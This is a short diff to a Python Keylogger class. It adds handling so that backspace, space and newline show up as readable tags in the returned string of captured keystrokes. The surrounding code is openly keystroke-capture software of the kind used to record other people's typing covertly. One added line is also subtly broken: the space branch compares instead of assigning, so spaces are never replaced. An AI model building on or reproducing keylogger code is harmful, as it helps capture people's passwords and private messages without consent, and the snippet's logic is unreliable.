@@ -30,6 +30,12 @@ class Keylogger:
             self.hooking = False
             keyboard.unhook_all()
             for key in self.keystroke_logged:
+                if key == "[backspace]":
+                    key = "[bs]"
+                elif key == " ":
+                    key == "[sp]"
+                elif key == "\n":
+                    key = "[\\n]"
                 r += key
             self.keystroke_logged.clear()
         return r
